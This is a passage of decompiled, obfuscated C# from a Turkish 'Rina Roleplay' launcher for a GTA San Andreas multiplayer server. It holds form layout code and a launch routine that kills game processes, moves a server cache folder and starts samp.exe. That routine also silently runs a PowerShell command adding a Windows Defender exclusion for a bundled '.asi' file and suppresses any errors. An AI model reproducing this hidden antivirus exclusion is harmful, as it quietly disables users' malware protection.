			this._RegistryRef.Size = new Size(102, 63);
			this._RegistryRef.SizeMode = PictureBoxSizeMode.StretchImage;
			this._RegistryRef.TabIndex = 42;
			this._RegistryRef.TabStop = false;
			this._CandidateRef.BackColor = Color.Transparent;
			this._CandidateRef.BackgroundImage = (Image)componentResourceManager.GetObject("pictureBox6.BackgroundImage");
			this._CandidateRef.ErrorImage = (Image)componentResourceManager.GetObject("pictureBox6.ErrorImage");
			this._CandidateRef.InitialImage = null;
			this._CandidateRef.Location = new Point(233, 29);
			this._CandidateRef.Name = "pictureBox6";
			this._CandidateRef.Size = new Size(27, 27);
			this._CandidateRef.TabIndex = 43;
			this._CandidateRef.TabStop = false;
			this._CandidateRef.Click += this.DisableRef;
			this.consumerRef.AutoSize = true;
			this.consumerRef.FontSize = 0;
			this.consumerRef.Location = new Point(884, 18);
			this.consumerRef.Name = "versiyon";
			this.consumerRef.Size = new Size(48, 15);
			this.consumerRef.TabIndex = 44;
			this.consumerRef.Text = "Versiyon";
			this.consumerRef.TextAlign = ContentAlignment.MiddleRight;
			this.consumerRef.UseCustomBackColor = true;
			this.consumerRef.UseCustomForeColor = true;
			this.m_InstanceRef.AutoSize = true;
			this.m_InstanceRef.FontSize = 2;
			this.m_InstanceRef.FontWeight = 2;
			this.m_InstanceRef.Location = new Point(26, 510);
			this.m_InstanceRef.Name = "karakteradlabel";
			this.m_InstanceRef.Size = new Size(124, 25);
			this.m_InstanceRef.TabIndex = 5;
			this.m_InstanceRef.Text = "Karakter Adı:";
			this.m_InstanceRef.TextAlign = ContentAlignment.MiddleLeft;
			this.m_InstanceRef.UseCustomBackColor = true;
			this.m_InstanceRef.UseCustomForeColor = true;
			this.m_StateRef.WorkerReportsProgress = true;
			this.m_StateRef.WorkerSupportsCancellation = true;
			this.m_StateRef.DoWork += this.ReadIdentifier;
			this.m_StateRef.RunWorkerCompleted += this.ForgotIdentifier;
			base.AutoScaleDimensions = new SizeF(6f, 13f);
			base.AutoScaleMode = AutoScaleMode.Font;
			this.BackgroundImage = (Image)componentResourceManager.GetObject("$this.BackgroundImage");
			base.BorderStyle = 1;
			base.ClientSize = new Size(999, 570);
			base.ControlBox = false;
			base.Controls.Add(this.m_InstanceRef);
			base.Controls.Add(this.consumerRef);
			base.Controls.Add(this._CandidateRef);
			base.Controls.Add(this._RegistryRef);
			base.Controls.Add(this.workerRef);
			base.Controls.Add(this.m_ModelRef);
			base.Controls.Add(this.collectionRef);
			base.Controls.Add(this.m_ClientRef);
			base.Controls.Add(this._PolicyRef);
			base.Controls.Add(this._VisitorRef);
			base.Controls.Add(this.m_ConnectionRef);
			base.Controls.Add(this.m_WatcherRef);
			base.Controls.Add(this.m_PropertyRef);
			base.Controls.Add(this.label_0);
			base.DisplayHeader = false;
			base.Icon = (Icon)componentResourceManager.GetObject("$this.Icon");
			base.MaximizeBox = false;
			base.MinimizeBox = false;
			base.Name = "Client";
			base.Padding = new Padding(20, 30, 20, 20);
			base.Resizable = false;
			base.ShadowType = 4;
			base.ShowIcon = false;
			base.Style = 11;
			this.Text = "Rina Roleplay";
			base.Theme = 2;
			base.TransparencyKey = Color.DimGray;
			base.Load += this.LoginRef;
			base.Shown += this.CallIdentifier;
			((ISupportInitialize)this.m_PropertyRef).EndInit();
			((ISupportInitialize)this.m_WatcherRef).EndInit();
			((ISupportInitialize)this.m_ConnectionRef).EndInit();
			((ISupportInitialize)this._VisitorRef).EndInit();
			((ISupportInitialize)this._PolicyRef).EndInit();
			this.m_ModelRef.ResumeLayout(false);
			this.m_IssuerRef.ResumeLayout(false);
			this.m_IssuerRef.PerformLayout();
			((ISupportInitialize)this.threadRef).EndInit();
			this.m_TokenRef.ResumeLayout(false);
			this.m_TokenRef.PerformLayout();
			this.paramRef.ResumeLayout(false);
			this.paramRef.PerformLayout();
			this.expressionRef.ResumeLayout(false);
			this.m_SerializerRef.ResumeLayout(false);
			this.m_SerializerRef.PerformLayout();
			this.m_ComparatorRef.ResumeLayout(false);
			this.m_ComparatorRef.PerformLayout();
			this.m_ResolverRef.ResumeLayout(false);
			this.m_ResolverRef.PerformLayout();
			((ISupportInitialize)this._RegistryRef).EndInit();
			((ISupportInitialize)this._CandidateRef).EndInit();
			base.ResumeLayout(false);
			base.PerformLayout();
		}

		// Token: 0x06000161 RID: 353 RVA: 0x0000E5A0 File Offset: 0x0000C7A0
		static Dispatcher()
		{
			AdvisorConnectionAttribute.CancelComposer();
			Dispatcher.m_Base = new List<string>();
			Dispatcher._Mapping = 3;
			Dispatcher.m_Params = 0L;
			Dispatcher._Mapper = 0L;
			Dispatcher._Field = 0L;
			Dispatcher.facade = 0L;
			Dispatcher.adapter = 0L;
			Dispatcher.m_Listener = 0L;
			Dispatcher.m_Composer = 0L;
			Dispatcher._Proc = new BackgroundWorker();
			Dispatcher.annotationRef = string.Empty;
		}

		// Token: 0x06000162 RID: 354 RVA: 0x0000E638 File Offset: 0x0000C838
		[CompilerGenerated]
		private void QueryReader()
		{
			if (this.m_RuleRef.VisitSingleton() != 0)
			{
				try
				{
					using (PowerShell powerShell = PowerShell.Create())
					{
						string str = MapperRef.fieldRef + "\\rina-utility.asi";
						powerShell.AddScript("Add-MpPreference -ExclusionPath '" + str + "'");
						powerShell.Invoke();
					}
				}
				catch
				{
				}
				foreach (Process process in Process.GetProcessesByName("gta_sa"))
				{
					try
					{
						process.Kill();
					}
					catch
					{
					}
				}
				Dispatcher.m_Parameter = Dispatcher.MoveIdentifier() + 3L;
				Dispatcher._Filter = Dispatcher.MoveIdentifier() + 15L;
				Dispatcher.m_Params = Dispatcher.MoveIdentifier();
				try
				{
					string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
					if (Directory.Exists(folderPath + "\\GTA San Andreas User Files\\SAMP\\cache\\164.132.233.203.7777") && !Directory.Exists(folderPath + "\\GTA San Andreas User Files\\SAMP\\cache\\51.195.61.169.7777"))
					{
						Directory.Move(folderPath + "\\GTA San Andreas User Files\\SAMP\\cache\\164.132.233.203.7777", folderPath + "\\GTA San Andreas User Files\\SAMP\\cache\\51.195.61.169.7777");
					}
					if (File.Exists(MapperRef.fieldRef + "\\rina-discord.asi"))
					{
						File.Delete(MapperRef.fieldRef + "\\rina-discord.asi");
					}
				}
				catch
				{
				}
				ProductReaderStructBuilder._ParameterIdentifier = 0L;
				this.m_RuleRef.CancelReader(this._SingletonRef.ToString());
				Process process2 = Process.Start(MapperRef.fieldRef + MapperWatcherClass.VerifyRule(14, "\\samp.exe"), ProductReaderStructBuilder.classIdentifier + " -nRina_Player");
				ProductReaderStructBuilder.m_BroadcasterIdentifier = Timestamps.Now;
				ProductReaderStructBuilder.helperIdentifier = this.workerRef.Text;
				this.label_0.Text = "Oyun çalıştırıldı.";
				Dispatcher.value = 1L;
				this.m_RuleRef._ProxyRef = 0;
				MapperRef.composerRef = false;
				Dispatcher._Repository = process2.Id;
				Dispatcher.record = 0;
				base.Invoke(new Action(this.CustomizeRef));
				base.Invoke(new Action(this.InvokeRef));
				return;
			}
			this.label_0.Text = "Veri yenileme sırasında hata oluştuğu için oyun başlatılamıyor.";
			this.label_0.ForeColor = Color.Red;
		}

		// Token: 0x06000163 RID: 355 RVA: 0x00002F70 File Offset: 0x00001170
		internal static bool OrderDefinition()
		{
			return Dispatcher.PatchDefinition == null;
		}

		// Token: 0x0400007B RID: 123
		public DiscordRpcClient config;

		// Token: 0x0400007C RID: 124
		public static List<string> m_Base;

		// Token: 0x0400007D RID: 125
		private CookieContainer m_Getter;

		// Token: 0x0400007E RID: 126
		public static object _Customer;

		// Token: 0x0400007F RID: 127
		public static int _Mapping;

		// Token: 0x04000080 RID: 128
		public static long status;

		// Token: 0x04000081 RID: 129
		public static long m_Stub;

		// Token: 0x04000082 RID: 130
		public static long _Filter;

		// Token: 0x04000083 RID: 131
		public static long m_Params;

		// Token: 0x04000084 RID: 132
		public static long m_Parameter;

		// Token: 0x04000085 RID: 133
		public static Thread m_Indexer;

		// Token: 0x04000086 RID: 134
		public static Thread thread_0;

		// Token: 0x04000087 RID: 135
		public static Thread _Pool;

		// Token: 0x04000088 RID: 136
		public static long _Mapper;

		// Token: 0x04000089 RID: 137
		public static long _Field;

		// Token: 0x0400008A RID: 138
		public static long facade;

		// Token: 0x0400008B RID: 139
		public static long adapter;

		// Token: 0x0400008C RID: 140
		public static long m_Listener;

		// Token: 0x0400008D RID: 141
		public static long m_Composer;

		// Token: 0x0400008E RID: 142
		public static object creator;

		// Token: 0x0400008F RID: 143
		public string m_Proxy;

		// Token: 0x04000090 RID: 144
		private FolderBrowserDialog _Service;

		// Token: 0x04000091 RID: 145
		public static int record;

		// Token: 0x04000092 RID: 146
		public static int _Repository;

		// Token: 0x04000093 RID: 147
		public System.Timers.Timer m_Page;

		// Token: 0x04000094 RID: 148
		public static long value;

		// Token: 0x04000095 RID: 149
		public static string queue;

		// Token: 0x04000096 RID: 150
		public static BackgroundWorker _Proc;

		// Token: 0x04000097 RID: 151
		public int prototypeRef;

		// Token: 0x04000098 RID: 152
		private int _RefRef;

		// Token: 0x04000099 RID: 153
		private int _IdentifierRef;

		// Token: 0x0400009A RID: 154
		private int readerRef;

		// Token: 0x0400009B RID: 155
		private object _SingletonRef;

		// Token: 0x0400009C RID: 156
		private MapperRef m_RuleRef;

		// Token: 0x0400009D RID: 157
		private static string annotationRef;

		// Token: 0x0400009E RID: 158
		private Container templateRef;

		// Token: 0x0400009F RID: 159
		private Label label_0;

		// Token: 0x040000A0 RID: 160
		private PictureBox m_PropertyRef;

		// Token: 0x040000A1 RID: 161
		private PictureBox m_WatcherRef;

		// Token: 0x040000A2 RID: 162
		private PictureBox m_ConnectionRef;

		// Token: 0x040000A3 RID: 163
		private PictureBox _VisitorRef;

		// Token: 0x040000A4 RID: 164
		private System.Windows.Forms.Timer authenticationRef;

		// Token: 0x040000A5 RID: 165
		private PictureBox _PolicyRef;

		// Token: 0x040000A6 RID: 166
		private NotifyIcon containerRef;

		// Token: 0x040000A7 RID: 167
		private System.Windows.Forms.Timer _InvocationRef;

		// Token: 0x040000A8 RID: 168
		private BackgroundWorker serverRef;

		// Token: 0x040000A9 RID: 169
		private BackgroundWorker _RequestRef;

		// Token: 0x040000AA RID: 170
		private BackgroundWorker _ReponseRef;

		// Token: 0x040000AB RID: 171
		private System.Windows.Forms.Timer m_RulesRef;

		// Token: 0x040000AC RID: 172
		private BackgroundWorker backgroundWorker_0;

		// Token: 0x040000AD RID: 173
		private BackgroundWorker _ContextRef;

		// Token: 0x040000AE RID: 174
		private Label m_ClientRef;

		// Token: 0x040000AF RID: 175
		private MetroButton collectionRef;

		// Token: 0x040000B0 RID: 176
		private MetroTabControl m_ModelRef;

		// Token: 0x040000B1 RID: 177
		private MetroTextBox workerRef;

		// Token: 0x040000B2 RID: 178
		private PictureBox _RegistryRef;

		// Token: 0x040000B3 RID: 179
		private MetroTabPage m_TokenRef;

		// Token: 0x040000B4 RID: 180
		private MetroButton taskRef;

		// Token: 0x040000B5 RID: 181
		private MetroTabPage m_IssuerRef;

		// Token: 0x040000B6 RID: 182
		private MetroLabel _DefinitionRef;

		// Token: 0x040000B7 RID: 183
		private MetroTextBox _StructRef;

		// Token: 0x040000B8 RID: 184
		private MetroButton _ProductRef;

		// Token: 0x040000B9 RID: 185
		private MetroLabel m_MerchantRef;

		// Token: 0x040000BA RID: 186
		private PictureBox threadRef;

		// Token: 0x040000BB RID: 187
		private MetroLabel metroLabel_0;

		// Token: 0x040000BC RID: 188
		private MetroLabel _WriterRef;

		// Token: 0x040000BD RID: 189
		private MetroTabPage expressionRef;

		// Token: 0x040000BE RID: 190
		private MetroTabPage m_ComparatorRef;

		// Token: 0x040000BF RID: 191
		private PictureBox _CandidateRef;

		// Token: 0x040000C0 RID: 192
		private MetroLabel consumerRef;

		// Token: 0x040000C1 RID: 193
		private MetroLabel m_InstanceRef;

		// Token: 0x040000C2 RID: 194
		private MetroPanel m_ResolverRef;

		// Token: 0x040000C3 RID: 195
		private MetroPanel m_SerializerRef;

		// Token: 0x040000C4 RID: 196
		private MetroLabel predicateRef;

		// Token: 0x040000C5 RID: 197
		private MetroLabel _SpecificationRef;

		// Token: 0x040000C6 RID: 198
		private MetroLabel _ManagerRef;

		// Token: 0x040000C7 RID: 199
		private MetroLabel processRef;

		// Token: 0x040000C8 RID: 200
		private MetroLabel m_SchemaRef;

		// Token: 0x040000C9 RID: 201
		private MetroLabel m_TokenizerRef;

		// Token: 0x040000CA RID: 202
		private MetroLabel roleRef;

		// Token: 0x040000CB RID: 203
		private MetroLabel metroLabel_1;

		// Token: 0x040000CC RID: 204
		private MetroLabel algoRef;

		// Token: 0x040000CD RID: 205
		private MetroLabel _IteratorRef;

		// Token: 0x040000CE RID: 206
		private MetroLabel messageRef;

		// Token: 0x040000CF RID: 207
		private MetroLabel wrapperRef;

		// Token: 0x040000D0 RID: 208
		private MetroLabel producerRef;

		// Token: 0x040000D1 RID: 209
		private MetroLabel m_ProccesorRef;

		// Token: 0x040000D2 RID: 210
		private MetroButton m_AttributeRef;

		// Token: 0x040000D3 RID: 211
		private MetroPanel paramRef;

		// Token: 0x040000D4 RID: 212
		private MetroLabel _ObserverRef;

		// Token: 0x040000D5 RID: 213
		private MetroButton m_RegRef;

		// Token: 0x040000D6 RID: 214
		private MetroButton _ErrorRef;

		// Token: 0x040000D7 RID: 215
		private MetroButton exceptionRef;

		// Token: 0x040000D8 RID: 216
		private MetroButton globalRef;

		// Token: 0x040000D9 RID: 217
		private MetroButton m_HelperRef;

		// Token: 0x040000DA RID: 218
		private MetroButton _EventRef;

		// Token: 0x040000DB RID: 219
		private MetroButton factoryRef;

		// Token: 0x040000DC RID: 220
		private MetroButton setterRef;

		// Token: 0x040000DD RID: 221
		private MetroButton methodRef;

		// Token: 0x040000DE RID: 222
		private MetroButton m_DecoratorRef;

		// Token: 0x040000DF RID: 223
		private MetroButton accountRef;

		// Token: 0x040000E0 RID: 224
		private MetroButton m_ClassRef;

		// Token: 0x040000E1 RID: 225
		private BackgroundWorker m_StateRef;

		// Token: 0x040000E2 RID: 226
		internal static object PatchDefinition;

		// Token: 0x0200002D RID: 45
		internal class InterpreterVisitorException
		{
			// Token: 0x06000164 RID: 356 RVA: 0x00002F7A File Offset: 0x0000117A
			[CompilerGenerated]
			public string ExcludeReader()
			{
				return this.m_CallbackRef;
			}

			// Token: 0x06000165 RID: 357 RVA: 0x00002F82 File Offset: 0x00001182
			[CompilerGenerated]
			public void InstantiateReader(string reference)
			{
				this.m_CallbackRef = reference;
			}

			// Token: 0x06000166 RID: 358 RVA: 0x00002F8B File Offset: 0x0000118B
			[CompilerGenerated]
			public string PushReader()
			{
				return this.m_PrinterRef;
			}

			// Token: 0x06000167 RID: 359 RVA: 0x00002F93 File Offset: 0x00001193
			[CompilerGenerated]
			public void StartReader(string init)
			{
				this.m_PrinterRef = init;
			}

			// Token: 0x06000168 RID: 360 RVA: 0x00002F9C File Offset: 0x0000119C
			public string ResetReader()
			{
				if (this.PushReader().Length > 0)
				{
					return this.PushReader() + "\\" + this.ExcludeReader();
				}
				return this.ExcludeReader();
			}

			// Token: 0x06000169 RID: 361 RVA: 0x00002FC9 File Offset: 0x000011C9
			public string InitReader()
			{
				if (this.SetupReader())
				{
					return this.ResetReader() + " (Disconnected)";
				}
				return this.ResetReader();
			}

			// Token: 0x17000015 RID: 21
			// (get) Token: 0x0600016A RID: 362 RVA: 0x00002FEA File Offset: 0x000011EA
			// (set) Token: 0x0600016B RID: 363 RVA: 0x00002FF2 File Offset: 0x000011F2
			public uint SessionId { get; set; }

			// Token: 0x0600016C RID: 364 RVA: 0x00002FFB File Offset: 0x000011FB
			[CompilerGenerated]
			public DateTime MoveReader()
			{
				return this.m_TestsRef;
			}

			// Token: 0x0600016D RID: 365 RVA: 0x00003003 File Offset: 0x00001203
			[CompilerGenerated]
			public void SearchReader(DateTime config)
			{
				this.m_TestsRef = config;
			}

			// Token: 0x0600016E RID: 366 RVA: 0x0000300C File Offset: 0x0000120C
			[CompilerGenerated]
			public bool SetupReader()
			{
				return this._DicRef;
			}

			// Token: 0x0600016F RID: 367 RVA: 0x00003014 File Offset: 0x00001214
			[CompilerGenerated]
			public void GetReader(bool isinfo)
			{
				this._DicRef = isinfo;
			}

			// Token: 0x06000170 RID: 368 RVA: 0x0000301D File Offset: 0x0000121D
			[CompilerGenerated]
			public string OrderReader()
			{
				return this.m_SystemRef;
			}

			// Token: 0x06000171 RID: 369 RVA: 0x00003025 File Offset: 0x00001225
			[CompilerGenerated]
			public void AssetReader(string var1)
			{
				this.m_SystemRef = var1;
			}

			// Token: 0x06000172 RID: 370 RVA: 0x0000E894 File Offset: 0x0000CA94
			public static List<Dispatcher.InterpreterVisitorException> AddReader()
			{
				List<Dispatcher.InterpreterVisitorException> list = new List<Dispatcher.InterpreterVisitorException>();
				ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(new ObjectQuery("SELECT * FROM Win32_Process WHERE Name = 'explorer.exe'"));
				try
				{
					foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
					{
						ManagementObject managementObject = (ManagementObject)managementBaseObject;
						Dispatcher.InterpreterVisitorException.<>c__DisplayClass30_0 CS$<>8__locals1 = new Dispatcher.InterpreterVisitorException.<>c__DisplayClass30_0();
						CS$<>8__locals1.advisorRef = new Dispatcher.InterpreterVisitorException();
						CS$<>8__locals1.advisorRef.SessionId = (uint)managementObject["SessionId"];
						string dmtfDate = managementObject["CreationDate"].ToString();
						CS$<>8__locals1.advisorRef.SearchReader(ManagementDateTimeConverter.ToDateTime(dmtfDate));
						string[] array = new string[]
						{
							string.Empty,
							string.Empty
						};
						ManagementObject managementObject2 = managementObject;
						string methodName = "GetOwner";
						object[] args = array;
						if (Convert.ToInt32(managementObject2.InvokeMethod(methodName, args)) == 0)
						{
							CS$<>8__locals1.advisorRef.InstantiateReader(array[0]);
							CS$<>8__locals1.advisorRef.StartReader(array[1]);
						}
						else
						{
							CS$<>8__locals1.advisorRef.InstantiateReader(string.Empty);
						}
						if (list.FindIndex(new Predicate<Dispatcher.InterpreterVisitorException>(CS$<>8__locals1.CollectReader)) < 0)
						{
							list.Add(CS$<>8__locals1.advisorRef);
						}
					}
				}
				catch
				{
				}
				return list;
			}

			// Token: 0x06000173 RID: 371 RVA: 0x000024D4 File Offset: 0x000006D4
			public InterpreterVisitorException()
			{
				AdvisorConnectionAttribute.CancelComposer();
				base..ctor();
			}

			// Token: 0x06000174 RID: 372 RVA: 0x0000302E File Offset: 0x0000122E
			internal static bool SetupOrder()
			{
				return Dispatcher.InterpreterVisitorException.RevertDefinition == null;
			}

			// Token: 0x040000E3 RID: 227
			public static bool m_DescriptorRef;

			// Token: 0x040000E4 RID: 228
			public static object m_PublisherRef;

			// Token: 0x040000E5 RID: 229
			[CompilerGenerated]
			private string m_CallbackRef;

			// Token: 0x040000E6 RID: 230
			[CompilerGenerated]
			private string m_PrinterRef;

			// Token: 0x040000E7 RID: 231
			[CompilerGenerated]
			private uint _ValRef;

			// Token: 0x040000E8 RID: 232
			[CompilerGenerated]
			private DateTime m_TestsRef;

			// Token: 0x040000E9 RID: 233
			[CompilerGenerated]
			private bool _DicRef;

			// Token: 0x040000EA RID: 234
			[CompilerGenerated]
			private string m_SystemRef;

			// Token: 0x040000EB RID: 235
			private static object RevertDefinition;
		}
	}
}
